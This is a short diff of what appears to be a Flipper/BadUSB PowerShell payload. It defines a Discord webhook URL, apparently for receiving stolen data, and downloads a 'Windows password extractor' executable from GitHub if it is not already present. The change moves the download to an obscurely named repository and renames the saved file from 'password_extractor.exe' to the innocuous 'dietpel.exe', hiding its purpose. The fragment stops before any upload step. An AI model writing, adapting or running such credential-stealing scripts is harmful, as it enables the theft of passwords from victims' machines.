@@ -4,10 +4,10 @@
 $webhookUrl = 'https://discord.com/api/webhooks/1369454757533454356/B2fwEhJqhY2nuEmIoQNaKFAzfe8VWkjHXzZmXFhKNCblp-xT-CgkoOPL6DEf-N4XXNZo'
 
 # URL of the Windows password extractor binary
-$exeUrl = 'https://github.com/aran1910/FlipperPasswordExtractor/raw/refs/heads/master/build/dietpeng.exe'
+$exeUrl = 'https://github.com/aran1910/ddd/raw/refs/heads/main/dietpeng.exe'
 
 # Local filename for the extractor
-$exePath = '.\password_extractor.exe'
+$exePath = '.\dietpel.exe'
 
 # Download the extractor if it's not already there
 if (-not (Test-Path $exePath)) {
